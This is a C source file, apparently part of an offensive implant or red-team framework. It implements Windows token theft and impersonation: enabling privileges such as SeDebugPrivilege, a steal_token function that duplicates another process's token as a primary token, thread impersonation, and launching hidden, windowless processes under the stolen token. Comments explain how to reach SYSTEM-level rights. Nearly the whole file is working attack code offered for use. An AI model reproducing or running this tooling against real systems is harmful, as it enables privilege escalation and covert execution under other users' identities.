#include "../../include/utils/token.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//////////////////////////////////////////////////////////////
// Internal Helpers //////////////////////////////////////////
//////////////////////////////////////////////////////////////

// Shared body for enable/disable — Attributes = SE_PRIVILEGE_ENABLED or 0.
static int adjust_privilege(const char *privName, DWORD attributes) {
  if (!privName) {
    pretty_print(LOG_ERROR, "adjust_privilege: invalid parameters");
    return -1;
  }

  HANDLE hToken;
  if (!OpenProcessToken(GetCurrentProcess(),
                        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
    pretty_print(LOG_ERROR,
                 "adjust_privilege: OpenProcessToken failed: %lu",
                 GetLastError());
    return -1;
  }

  LUID luid;
  if (!LookupPrivilegeValueA(NULL, privName, &luid)) {
    pretty_print(LOG_ERROR,
                 "adjust_privilege: LookupPrivilegeValue('%s') failed: %lu",
                 privName, GetLastError());
    CloseHandle(hToken);
    return -1;
  }

  TOKEN_PRIVILEGES tp;
  tp.PrivilegeCount           = 1;
  tp.Privileges[0].Luid       = luid;
  tp.Privileges[0].Attributes = attributes;

  AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
  DWORD err = GetLastError();
  CloseHandle(hToken);

  // AdjustTokenPrivileges returns TRUE even on partial failure;
  // ERROR_NOT_ALL_ASSIGNED is the real indicator that nothing changed.
  if (err == ERROR_NOT_ALL_ASSIGNED) {
    pretty_print(LOG_ERROR,
                 "adjust_privilege: '%s' not held — cannot %s",
                 privName,
                 attributes ? "enable" : "disable");
    return -1;
  }

  pretty_print(LOG_SUCCESS, "adjust_privilege: '%s' %s",
               privName, attributes ? "enabled" : "disabled");
  return 0;
}

//////////////////////////////////////////////////////////////
// Privilege Manipulation ////////////////////////////////////
//////////////////////////////////////////////////////////////

int enable_privilege(const char *privName) {
  return adjust_privilege(privName, SE_PRIVILEGE_ENABLED);
}

int disable_privilege(const char *privName) {
  return adjust_privilege(privName, 0);
}

//////////////////////////////////////////////////////////////
// Token Theft ///////////////////////////////////////////////
//////////////////////////////////////////////////////////////

/**
 * Open a process's token and duplicate it as a primary token.
 *
 * Steps:
 *   1. OpenProcess(PROCESS_QUERY_INFORMATION) — minimal rights needed
 *   2. OpenProcessToken(TOKEN_DUPLICATE | TOKEN_QUERY)
 *   3. DuplicateTokenEx → primary token with TOKEN_ALL_ACCESS
 *
 * The returned handle must be closed by the caller with CloseHandle().
 * Call enable_privilege("SeDebugPrivilege") before targeting cross-session
 * or highly-privileged processes.
 */
HANDLE steal_token(DWORD pid) {
  HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
  if (!hProcess) {
    pretty_print(LOG_ERROR,
                 "steal_token: OpenProcess(%lu) failed: %lu — "
                 "try enable_privilege(\"SeDebugPrivilege\") first",
                 pid, GetLastError());
    return NULL;
  }

  HANDLE hToken;
  if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
    pretty_print(LOG_ERROR,
                 "steal_token: OpenProcessToken(%lu) failed: %lu",
                 pid, GetLastError());
    CloseHandle(hProcess);
    return NULL;
  }
  CloseHandle(hProcess);

  HANDLE hDup;
  if (!DuplicateTokenEx(hToken,
                        TOKEN_ALL_ACCESS,
                        NULL,
                        SecurityImpersonation,
                        TokenPrimary, // Primary so it can launch processes
                        &hDup)) {
    pretty_print(LOG_ERROR,
                 "steal_token: DuplicateTokenEx(%lu) failed: %lu",
                 pid, GetLastError());
    CloseHandle(hToken);
    return NULL;
  }

  CloseHandle(hToken);

  pretty_print(LOG_SUCCESS, "steal_token: duplicated primary token from PID %lu",
               pid);
  return hDup;
}

//////////////////////////////////////////////////////////////
// Impersonation /////////////////////////////////////////////
//////////////////////////////////////////////////////////////

int impersonate_token(HANDLE hToken) {
  if (!hToken) {
    pretty_print(LOG_ERROR, "impersonate_token: NULL token");
    return -1;
  }

  // ImpersonateLoggedOnUser accepts both primary and impersonation tokens.
  // For a primary token it internally duplicates to impersonation level.
  if (!ImpersonateLoggedOnUser(hToken)) {
    pretty_print(LOG_ERROR,
                 "impersonate_token: ImpersonateLoggedOnUser failed: %lu",
                 GetLastError());
    return -1;
  }

  pretty_print(LOG_SUCCESS, "impersonate_token: impersonation active on current thread");
  return 0;
}

int revert_impersonation(void) {
  if (!RevertToSelf()) {
    pretty_print(LOG_ERROR, "revert_impersonation: RevertToSelf failed: %lu",
                 GetLastError());
    return -1;
  }
  pretty_print(LOG_SUCCESS, "revert_impersonation: thread token restored");
  return 0;
}

//////////////////////////////////////////////////////////////
// Spawning Under a Token ////////////////////////////////////
//////////////////////////////////////////////////////////////

/**
 * Launch a hidden process under hToken and track it in the thread table.
 *
 * CreateProcessAsUserA requirements (caller must hold in *their* token):
 *   - SeAssignPrimaryTokenPrivilege — to assign the token to the child
 *   - SeIncreaseQuotaPrivilege      — to adjust child process quotas
 *
 * Both are typically available at SYSTEM level. If running as a lower-
 * privileged user, enable them via enable_privilege() first or obtain them
 * after impersonating a SYSTEM token.
 */
int spawn_as_token(HANDLE hToken, const char *binaryPath, const char *args,
                   DWORD *out_slot) {
  if (!hToken || !binaryPath) {
    pretty_print(LOG_ERROR, "spawn_as_token: invalid parameters");
    return -1;
  }

  // Request the privileges CreateProcessAsUserA needs
  enable_privilege(SE_INCREASE_QUOTA_NAME);
  enable_privilege(SE_ASSIGNPRIMARYTOKEN_NAME);

  char cmdline[32767];
  if (args && *args) {
    snprintf(cmdline, sizeof(cmdline), "\"%s\" %s", binaryPath, args);
  } else {
    snprintf(cmdline, sizeof(cmdline), "\"%s\"", binaryPath);
  }

  STARTUPINFOA si;
  PROCESS_INFORMATION pi;
  memset(&si, 0, sizeof(si));
  memset(&pi, 0, sizeof(pi));
  si.cb          = sizeof(si);
  si.dwFlags     = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;

  if (!CreateProcessAsUserA(
          hToken,
          NULL,                                    // Derive exe from cmdline
          cmdline,
          NULL, NULL,                              // Default security attrs
          FALSE,                                   // Don't inherit handles
          CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
          NULL, NULL,                              // Inherit env / cwd
          &si, &pi)) {
    pretty_print(LOG_ERROR,
                 "spawn_as_token: CreateProcessAsUserA failed: %lu — "
                 "ensure SeAssignPrimaryTokenPrivilege and "
                 "SeIncreaseQuotaPrivilege are held",
                 GetLastError());
    return -1;
  }

  // Hand ownership of both handles to the thread tracking table
  char label[512];
  snprintf(label, sizeof(label), "[token] %s", binaryPath);

  int rc = thread_register(pi.hProcess, pi.hThread,
                           pi.dwProcessId, pi.dwThreadId,
                           THREAD_EXEC_BINARY, label, out_slot);
  if (rc != 0) {
    // Registration failed — close handles ourselves to avoid leaks
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
  }

  return rc;
}

//////////////////////////////////////////////////////////////
// Token Inspection //////////////////////////////////////////
//////////////////////////////////////////////////////////////

void print_token_info(HANDLE hToken) {
  if (!hToken) {
    pretty_print(LOG_ERROR, "print_token_info: NULL token");
    return;
  }

  // ── User account ──────────────────────────────────────────────────────────
  DWORD sz = 0;
  GetTokenInformation(hToken, TokenUser, NULL, 0, &sz);
  TOKEN_USER *tu = (TOKEN_USER *)malloc(sz);
  if (tu && GetTokenInformation(hToken, TokenUser, tu, sz, &sz)) {
    char name[256]   = "<unknown>";
    char domain[256] = "<unknown>";
    DWORD nsz = sizeof(name), dsz = sizeof(domain);
    SID_NAME_USE use;
    LookupAccountSidA(NULL, tu->User.Sid, name, &nsz, domain, &dsz, &use);
    pretty_print(LOG_INFO, "Token user:      %s\\%s", domain, name);
  }
  free(tu);

  // ── Token type (primary vs impersonation) ─────────────────────────────────
  TOKEN_TYPE type;
  sz = sizeof(type);
  if (GetTokenInformation(hToken, TokenType, &type, sz, &sz)) {
    pretty_print(LOG_INFO, "Token type:      %s",
                 type == TokenPrimary ? "Primary" : "Impersonation");
  }

  // ── Integrity level ───────────────────────────────────────────────────────
  sz = 0;
  GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &sz);
  TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)malloc(sz);
  if (tml && GetTokenInformation(hToken, TokenIntegrityLevel, tml, sz, &sz)) {
    DWORD rid = *GetSidSubAuthority(tml->Label.Sid, 0);
    const char *level =
        rid < 0x1000 ? "Untrusted" :
        rid < 0x2000 ? "Low"       :
        rid < 0x3000 ? "Medium"    :
        rid < 0x4000 ? "High"      : "System";
    pretty_print(LOG_INFO, "Integrity level: %s (RID 0x%lx)", level, rid);
  }
  free(tml);

  // ── Elevation ─────────────────────────────────────────────────────────────
  TOKEN_ELEVATION elev;
  sz = sizeof(elev);
  if (GetTokenInformation(hToken, TokenElevation, &elev, sz, &sz)) {
    pretty_print(LOG_INFO, "Elevated:        %s",
                 elev.TokenIsElevated ? "yes" : "no");
  }
}
